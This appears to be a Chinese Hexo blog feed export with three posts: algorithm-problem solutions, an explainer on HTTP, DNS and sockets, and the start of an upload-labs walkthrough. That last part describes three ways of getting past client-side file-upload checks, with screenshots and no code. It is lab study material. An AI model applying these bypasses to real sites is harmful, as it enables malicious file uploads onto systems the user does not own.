因为要进行映射，所以hashtable第一个参数为值。</span></span><br><span class="line">            hashtable[nums[i]] = i</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>dict()用于创建一个字典。</p><p>enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。</p><p>Python 2.3. 以上版本可用，2.6 添加 start 参数。</p><p>语法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">enumerate</span>(sequence, [start=<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>返回值：</p><p>返回一个enumerate(枚举) 对象，enumerate有两个值，一个是数据的下标，一个是数据的本身。</p><p>哈希表插入过程：</p><pre><code>得到key通过hash函数得到hash值得到桶号(一般都为hash值对桶数求模)存放key和value在桶内。（hashtable[nums[i]]=i）</code></pre><p>哈希表取值过程：</p><pre><code>得到key通过hash函数得到hash值得到桶号(一般都为hash值对桶数求模)比较桶的内部元素是否与key相等，若都不相等，则没有找到。取出相等的记录的value。</code></pre><hr><h2 id="第二题："><a href="#第二题：" class="headerlink" title="第二题："></a>第二题：</h2><p>给你一个整数 x ，如果 x 是一个回文整数，返回 true ；否则，返回 false 。</p><p>回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p><p>例如，121 是回文，而 123 不是。</p><h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isPalindrome</span>(<span class="params">self, x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span></span><br><span class="line">        x = <span class="built_in">str</span>(x)</span><br><span class="line">        <span class="keyword">if</span> x == x[::-<span class="number">1</span>]:   <span class="comment"># 相当于将整个列表倒序输出。</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="方法2：-1"><a href="#方法2：-1" class="headerlink" title="方法2："></a>方法2：</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 特殊情况：</span></span><br><span class="line">        <span class="comment">// 如上所述，当 x &lt; 0 时，x 不是回文数。</span></span><br><span class="line">        <span class="comment">// 同样地，如果数字的最后一位是 0，为了使该数字为回文，</span></span><br><span class="line">        <span class="comment">// 则其第一位数字也应该是 0</span></span><br><span class="line">        <span class="comment">// 只有 0 满足这一属性</span></span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span> || (x % <span class="number">10</span> == <span class="number">0</span> &amp;&amp; x != <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> revertedNumber = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x &gt; revertedNumber) &#123;</span><br><span class="line">            revertedNumber = revertedNumber * <span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当数字长度为奇数时，我们可以通过 revertedNumber/10 去除处于中位的数字。</span></span><br><span class="line">        <span class="comment">// 例如，当输入为 12321 时，在 while 循环的末尾我们可以得到 x = 12，revertedNumber = 123，</span></span><br><span class="line">        <span class="comment">// 由于处于中位的数字不影响回文（它总是与自己相等），所以我们可以简单地将其去除。</span></span><br><span class="line">        <span class="keyword">return</span> x == revertedNumber || x == revertedNumber / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="第三题："><a href="#第三题：" class="headerlink" title="第三题："></a>第三题：</h2><p>罗马数字转整数</p><p>罗马数字包含以下七种字符: I， V， X， L，C，D 和 M。</p><p>字符          数值<br>I             1<br>V             5<br>X             10<br>L             50<br>C             100<br>D             500<br>M             1000</p><p>例如， 罗马数字 2 写做 II ，即为两个并列的 1 。12 写做 XII ，即为 X + II 。 27 写做  XXVII, 即为 XX + V + II 。</p><p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 IIII，而是 IV。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 IX。这个特殊的规则只适用于以下六种情况：</p><pre><code>I 可以放在 V (5) 和 X (10) 的左边，来表示 4 和 9。X 可以放在 L (50) 和 C (100) 的左边，来表示 40 和 90。 C 可以放在 D (500) 和 M (1000) 的左边，来表示 400 和 900。</code></pre><p>给定一个罗马数字，将其转换成整数。</p><p>示例 1:</p><p>输入: s = “III”<br>输出: 3</p><p>示例 2:</p><p>输入: s = “IV”<br>输出: 4</p><p>示例 3:</p><p>输入: s = “IX”<br>输出: 9</p><p>示例 4:</p><p>输入: s = “LVIII”<br>输出: 58<br>解释: L = 50, V= 5, III = 3.</p><p>示例 5:</p><p>输入: s = “MCMXCIV”<br>输出: 1994<br>解释: M = 1000, CM = 900, XC = 90, IV = 4.</p><p>提示：</p><pre><code>1 &lt;= s.length &lt;= 15s 仅含字符 (&#39;I&#39;, &#39;V&#39;, &#39;X&#39;, &#39;L&#39;, &#39;C&#39;, &#39;D&#39;, &#39;M&#39;)题目数据保证 s 是一个有效的罗马数字，且表示整数在范围 [1, 3999] 内题目所给测试用例皆符合罗马数字书写规则，不会出现跨位等情况。IL 和 IM 这样的例子并不符合题目要求，49 应该写作 XLIX，999 应该写作 CMXCIX 。</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    V_alue=&#123;</span><br><span class="line">        <span class="string">&#x27;I&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&#x27;V&#x27;</span>: <span class="number">5</span>,</span><br><span class="line">        <span class="string">&#x27;X&#x27;</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="string">&#x27;L&#x27;</span>: <span class="number">50</span>,</span><br><span class="line">        <span class="string">&#x27;C&#x27;</span>: <span class="number">100</span>,</span><br><span class="line">        <span class="string">&#x27;D&#x27;</span>: <span class="number">500</span>,</span><br><span class="line">        <span class="string">&#x27;M&#x27;</span>: <span class="number">1000</span>,    </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">romanToInt</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        cout = <span class="number">0</span></span><br><span class="line">        i = <span class="built_in">len</span>(s)</span><br><span class="line">        <span class="keyword">for</span> j,ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(s):</span><br><span class="line">            value = Solution.V_alue[ch]</span><br><span class="line">            <span class="keyword">if</span> j &lt; i-<span class="number">1</span> <span class="keyword">and</span> value &lt; Solution.V_alue[s[j+<span class="number">1</span>]]:</span><br><span class="line">                cout-=value</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cout+=value</span><br><span class="line">        <span class="keyword">return</span> cout        </span><br></pre></td></tr></table></figure><h2 id="第四题："><a href="#第四题：" class="headerlink" title="第四题："></a>第四题：</h2><p>最长公共前缀</p><p>编写一个函数来查找字符串数组中的最长公共前缀。</p><p>如果不存在公共前缀，返回空字符串 “”。</p><p> 示例 1：</p><p>输入：strs = [“flower”,”flow”,”flight”]<br>输出：”fl”</p><p>示例 2：</p><p>输入：strs = [“dog”,”racecar”,”car”]<br>输出：””<br>解释：输入不存在公共前缀。</p><p>提示：</p><pre><code>1 &lt;= strs.length &lt;= 2000 &lt;= strs[i].length &lt;= 200strs[i] 仅由小写英文字母组成</code></pre><h3 id="方法一：横向扫描："><a href="#方法一：横向扫描：" class="headerlink" title="方法一：横向扫描："></a>方法一：横向扫描：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestCommonPrefix</span>(<span class="params">self, strs: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> strs:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        prefix, count = strs[<span class="number">0</span>], <span class="built_in">len</span>(strs)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, count):</span><br><span class="line">            prefix = self.lcp(prefix, strs[i])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> prefix:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> prefix</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lcp</span>(<span class="params">self, str1, str2</span>):</span></span><br><span class="line">        length, index = <span class="built_in">min</span>(<span class="built_in">len</span>(str1), <span class="built_in">len</span>(str2)), <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> index &lt; length <span class="keyword">and</span> str1[index] == str2[index]:</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> str1[:index]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="方法二：纵向扫描："><a href="#方法二：纵向扫描：" class="headerlink" title="方法二：纵向扫描："></a>方法二：纵向扫描：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestCommonPrefix</span>(<span class="params">self, strs: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> strs:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        length, count = <span class="built_in">len</span>(strs[<span class="number">0</span>]), <span class="built_in">len</span>(strs)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">            c = strs[<span class="number">0</span>][i]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(i == <span class="built_in">len</span>(strs[j]) <span class="keyword">or</span> strs[j][i] != c <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, count)):</span><br><span class="line">                <span class="keyword">return</span> strs[<span class="number">0</span>][:i]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> strs[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>any():如果可迭代对象</p><h2 id="第五题："><a href="#第五题：" class="headerlink" title="第五题："></a>第五题：</h2><p>将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 </p><p>示例 1：</p><p><img src="https://assets.leetcode.com/uploads/2020/10/03/merge_ex1.jpg"></p><p>输入：l1 = [1,2,4], l2 = [1,3,4]<br>输出：[1,1,2,3,4,4]</p><p>示例 2：</p><p>输入：l1 = [], l2 = []<br>输出：[]</p><p>示例 3：</p><p>输入：l1 = [], l2 = [0]<br>输出：[0]</p><p>提示：</p><pre><code>两个链表的节点数目范围是 [0, 50]-100 &lt;= Node.val &lt;= 100l1 和 l2 均按 非递减顺序 排列</code></pre><h3 id="方法一：递归"><a href="#方法一：递归" class="headerlink" title="方法一：递归"></a>方法一：递归</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mergeTwoLists</span>(<span class="params">self, list1: <span class="type">Optional</span>[ListNode], list2: <span class="type">Optional</span>[ListNode]</span>) -&gt; <span class="type">Optional</span>[ListNode]:</span></span><br><span class="line">        <span class="keyword">if</span> list1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> list2</span><br><span class="line">        <span class="keyword">if</span> list2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> list1</span><br><span class="line">        <span class="keyword">if</span> list1.val &lt; list2.val:</span><br><span class="line">            list1.<span class="built_in">next</span> = self.mergeTwoLists(list1.<span class="built_in">next</span>,list2)</span><br><span class="line">            <span class="keyword">return</span> list1</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            list2.<span class="built_in">next</span> = self.mergeTwoLists(list1,list2.<span class="built_in">next</span>)</span><br><span class="line">            <span class="keyword">return</span> list2</span><br></pre></td></tr></table></figure><h2 id="第六题："><a href="#第六题：" class="headerlink" title="第六题："></a>第六题：</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>小蓝正在学习一门神奇的语言，这门语言中的单词都是由小写英文字母组 成，有些单词很长，远远超过正常英文单词的长度。小蓝学了很长时间也记不住一些单词，他准备不再完全记忆这些单词，而是根据单词中哪个字母出现得最多来分辨单词。</p><p>现在，请你帮助小蓝，给了一个单词后，帮助他找到出现最多的字母和这 个字母出现的次数。</p><h3 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述"></a>输入描述</h3><p>输入一行包含一个单词，单词只由小写英文字母组成。</p><p>对于所有的评测用例，输入的单词长度不超过 1000。</p><h3 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述"></a>输出描述</h3><p>输出两行，第一行包含一个英文字母，表示单词中出现得最多的字母是哪 个。如果有多个字母出现的次数相等，输出字典序最小的那个。</p><p>第二行包含一个整数，表示出现得最多的那个字母在单词中出现的次数。</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a = []</span><br><span class="line">c = 0</span><br><span class="line">str = input()</span><br><span class="line">for i in str:</span><br><span class="line">    if str.count(i) &gt;= c:</span><br><span class="line">        c = str.count(i)</span><br><span class="line">for i in str:</span><br><span class="line">    if str.count(i) == c:</span><br><span class="line">        a.append(i)</span><br><span class="line">a.sort()</span><br><span class="line">print(a[0])</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><h2 id="第七题："><a href="#第七题：" class="headerlink" title="第七题："></a>第七题：</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>小蓝给学生们组织了一场考试，卷面总分为 100 分，每个学生的得分都是一个 0 到 100 的整数。</p><p>如果得分至少是 60 分，则称为及格。如果得分至少为 85 分，则称为优秀。</p><p>请计算及格率和优秀率，用百分数表示，百分号前的部分四舍五入保留整 数。</p><h3 id="输入描述-1"><a href="#输入描述-1" class="headerlink" title="输入描述"></a>输入描述</h3><p>输入的第一行包含一个整数 n (1≤n≤104)n (1≤n≤104)，表示考试人数。</p><p>接下来 nn 行，每行包含一个 0 至 100 的整数，表示一个学生的得分。</p><h3 id="输出描述-1"><a href="#输出描述-1" class="headerlink" title="输出描述"></a>输出描述</h3><p>输出两行，每行一个百分数，分别表示及格率和优秀率。百分号前的部分 四舍五入保留整数。</p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">arr =[]</span><br><span class="line">good = 0</span><br><span class="line">better = 0</span><br><span class="line">a = int(input())</span><br><span class="line">for _ in range(a):</span><br><span class="line">    n = int(input())</span><br><span class="line">    if n &gt;= 60:</span><br><span class="line">        good = good +1</span><br><span class="line">    if n &gt;= 85:</span><br><span class="line">        better = better + 1</span><br><span class="line">print(&quot;&#123;:.0f&#125;%&quot;.format(100*good / a))</span><br><span class="line">print(&quot;&#123;:.0f&#125;%&quot;.format(100*better / a))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网络是怎样链接的</title>
      <link href="/2022/03/30/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E9%93%BE%E6%8E%A5%E7%9A%84/"/>
      <url>/2022/03/30/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E9%93%BE%E6%8E%A5%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<h1 id="名词简介："><a href="#名词简介：" class="headerlink" title="名词简介："></a>名词简介：</h1><h2 id="HTTP协议："><a href="#HTTP协议：" class="headerlink" title="HTTP协议："></a>HTTP协议：</h2><h3 id="HTTP协议之URL篇："><a href="#HTTP协议之URL篇：" class="headerlink" title="HTTP协议之URL篇："></a>HTTP协议之URL篇：</h3><p>  http（超文本传输协议）是一个基于请求与响应模式的、无状态的、应用层的协议，常基于TCP的连接方式，HTTP1.1版本中给出一种持续连接的机制，绝大多数的Web开发，都是构建在HTTP协议之上的Web应用。</p><p>HTTP URL (统一资源定位符，URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息)的格式如下：<br> [<a href="http://host[&quot;:&quot;port\][abs_path](http://host[&quot;&quot;port][abs_path/)]">http://host[&quot;:&quot;port\][abs_path](http://host[&quot;&quot;port][abs_path/)]</a><br> http表示要通过HTTP协议来定位网络资源；host表示合法的Internet主机域名或者IP地址；port指定一个端口号，为空则使用缺省端口80（通常情况下可以省略）；abs_path指定请求资源的URI；如果URL中没有给出abs_path，那么当它作为请求URI时，必须以“/”的形式给出，通常这个工作浏览器自动帮我们完成。<br> eg:<br> 1、输入：<a href="http://www.guet.edu.cn/">www.guet.edu.cn</a><br> 浏览器自动转换成：<a href="http://www.guet.edu.cn/">http://www.guet.edu.cn/</a><br> 2、http:192.168.0.116:8080/index.jsp </p><h3 id="HTTP协议之请求篇："><a href="#HTTP协议之请求篇：" class="headerlink" title="HTTP协议之请求篇："></a>HTTP协议之请求篇：</h3><p>http请求由3部分组成，包括请求行，请求头，请求体。</p><h4 id="请求行："><a href="#请求行：" class="headerlink" title="请求行："></a>请求行：</h4><p>主要结构为：&lt;方法&gt;&lt;空格&gt;<URI>&lt;空格&gt;&lt;HTTP版本&gt;</p><p>其中请求方法有以下几种：</p><hr><p>​    方法                                                                                                                                       含义</p><p>GET                 获取URI指定的信息。如果URI指定的是文件则返回文件的内容，如果URI指定的CGI程序，则返回该程序的输出数据。</p><p>POST              从客户端向服务器发送数据，一般用于发送表单中填写的数据等情况下。</p><p>HEAD             和GET基本相同。只不过它只返回HTTP的消息头，而并不返回数据的内容。用于获取文件的最后的更新时间等信息。</p><p>PUT                替换URI指定的服务器上的文件。如果URI指定的文件不存在，则创建该文件。</p><p>OPTIONS       用于通知或查询通信选项。</p><p>DELETE          删除URI指定的服务器上的文件。</p><p>TRACE            将服务器上收到的请求行和头部直接返回给客户端。用于在使用代理环境中检查改写请求的情况。</p><p>CONNECT      使用代理传输加密消息时使用的方法。</p><hr><h4 id="请求头："><a href="#请求头：" class="headerlink" title="请求头："></a>请求头：</h4><p>消息头的规格中定义了很多项目，如日期，客户端支持的数据类型，语言，压缩格式，客户端和服务器的软件名称和版本，数据有效期和最后更新时间等，其中主要的头字段如下：</p><img src="/2022/03/30/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E9%93%BE%E6%8E%A5%E7%9A%84/1.png" class=""><h4 id="消息体："><a href="#消息体：" class="headerlink" title="消息体："></a>消息体：</h4><p>写完消息头之后，还需要添加一个完全没有内容的空行，然后写上需要发送的数据。</p><h3 id="HTTP协议之响应篇："><a href="#HTTP协议之响应篇：" class="headerlink" title="HTTP协议之响应篇："></a>HTTP协议之响应篇：</h3><p>http请求由3部分组成，包括状态行，响应头，响应体。</p><h4 id="状态行："><a href="#状态行：" class="headerlink" title="状态行："></a>状态行：</h4><p>在响应消息中第一行的内容为状态码和响应短语，用来表示请求的执行结果是成功还是出错。</p><p>状态码是一个数字，它主要用来向程序告知执行的结果；相对的，响应短语则是一段文字，用来向人们告知执行的结果。</p><hr><p>状态码                                           含义</p><p>1**                                              告知请求的处理进度和情况</p><p>2**                                              成功</p><p>3**                                              表示需要进一步操作</p><p>4**                                              客户端错误</p><p>5**                                              服务器错误</p><hr><h4 id="响应头："><a href="#响应头：" class="headerlink" title="响应头："></a>响应头：</h4><img src="/2022/03/30/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E9%93%BE%E6%8E%A5%E7%9A%84/2.png" class=""><h4 id="响应体："><a href="#响应体：" class="headerlink" title="响应体："></a>响应体：</h4><p>响应体就是服务器返回的资源的内容。</p><h2 id="全世界的DNS的大接力："><a href="#全世界的DNS的大接力：" class="headerlink" title="全世界的DNS的大接力："></a>全世界的DNS的大接力：</h2><p>DNS（Domain Name System，域名系统），万维网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。</p><p>接力过程：</p><p>首先客户端会先访问最近的一台DNS服务器（也就是客户端的TCP/IP设置中填写的DNS服务器地址），假设我们要查询<a href="http://www.baidu.com.由于最近的dns服务器没有存放这一域名对应的消息,所以我们需要从上层开始向下找.最近的dns服务器中保存了根域dns服务器的信息,因此它会将来自客户端的查询消息转发给根域的dns服务器.根域的中的dns服务器中也没有www.baidu.com这个域名,但根据域名结构可以判断这个域名属于com域,因此根域的dns服务器会返回它所管理的com域中的dns服务器的ip地址,以此类推最终会找到我们需要的ip地址.但是有时候我们并不需要从最上级的根域开始查找,因为dns服务器有一个缓存的功能,可以记住之前查询过的域名,那么就直接可以从缓存中得到所需的信息,接下来的查询可以从缓存的位置开始向下进行,并且当要查询的域名不存在时,“不存在”这一响应结果也会被缓存,方便下次的快速响应./">www.baidu.com。由于最近的DNS服务器没有存放这一域名对应的消息，所以我们需要从上层开始向下找。最近的DNS服务器中保存了根域DNS服务器的信息，因此它会将来自客户端的查询消息转发给根域的DNS服务器。根域的中的DNS服务器中也没有www.baidu.com这个域名，但根据域名结构可以判断这个域名属于com域，因此根域的DNS服务器会返回它所管理的com域中的DNS服务器的IP地址，以此类推最终会找到我们需要的IP地址。但是有时候我们并不需要从最上级的根域开始查找，因为DNS服务器有一个缓存的功能，可以记住之前查询过的域名，那么就直接可以从缓存中得到所需的信息，接下来的查询可以从缓存的位置开始向下进行，并且当要查询的域名不存在时，“不存在”这一响应结果也会被缓存，方便下次的快速响应。</a></p><p>​               </p><h1 id="连接过程："><a href="#连接过程：" class="headerlink" title="连接过程："></a>连接过程：</h1><p>注：本过程不止只适用于浏览器，其他的应用程序也可以适用。</p><p>​        浏览器第一步进行的工作就是对URL进行解析，对URL进行解析完成后，浏览器会使用HTTP协议来访问web服务器，生成HTTP消息之后接下来会委托操作系统将消息发送给web服务器，在委托操作系统发送消息时，必须要提供的不是通信对象的域名，而是它的IP地址。因此，在生成HTTP消息之后，下一个步骤就是根据域名查询IP地址。查询IP地址的方法很简单，只需要询问最近的DNS服务器，之后会调用解析器（实际上是一段程序，它包含在操作系统的Socket库中），查询到之后解析器会读取消息取出IP地址，并将IP地址写入程序指定的内存地址中，应用程序这时可以取出内存地址中的IP地址，知道IP地址之后，就可以委托操作系统内部的协议栈向这个目标的IP地址，也就是我们要访问的web服务器发送消息，在进行发送消息之前需要先在建立连接的管道，建立管道的关键在于管道两端的数据出入口，这些出入口成为套接字。在创建套接字的时候客户端会调动Socket库中，之后在套接字创建完成之后，协议栈会返回一个描述符（用于区分不同的套接字），并将它放到内存之中，接下来我们需要委托协议栈将客户端创建的套接字与服务器的套接字连接起来，应用程序调动Socket库中名为connect的程序组件完成这一操作，当调动connect时，需要指定描述符（协议栈会根据这个描述符来判断到底使用哪一个套接字进行连接），服务器IP地址和端口号这3个参数。连接成功之后，协议栈会将对方的IP地址和端口号等信息保存到套接字中。之后就是进行通信阶段，因为应用程序无法直接控制套接字，所以还是要通过Socket库来委托协议栈来完成这个操作，这时候要使用write这个程序组件，当指定好描述符和发送数据之后就可以发送数据了，接下来，服务器会执行接收操作，解析收到的数据内容并向客户端响应消息，在接收到消息返回之后，客户端通过Socket库中的read程序组件委托协议栈，并将收到的消息存放到接收消息缓冲区，消息接收完之后，根据HTTP协议的规定服务器会先执行Socket库中的close来执行断开操作（实际上客户端和服务器哪一方先执行都有可能），断开操作到达客户端之后，客户端也会调用Socket库中的close来进行断开操作（在HTTP1.1中可以由客户端在进行完所有数据的传输之后再进行断开），自此整个通信活动结束。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传upload-labs通关教程</title>
      <link href="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/"/>
      <url>/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/1.png" class=""><p>这一关根据提示是一个文件上传的前端绕过，本题采用三种方法解决：</p><h2 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h2><p>通过直接禁用前端的JS来进行绕过。</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/2.png" class=""><p>文件上传成功。但这种方法会导致页面的某些功能显示不出来。</p><h2 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h2><p>通过BS修改后缀名，进行绕过。</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/3.png" class=""><p>如果js代码是在本地运行，很可能抓不到数据包。</p><h2 id="第三种："><a href="#第三种：" class="headerlink" title="第三种："></a>第三种：</h2><p>将网站源码复制下来，放到本地，然后将js代码删除。</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/4.png" 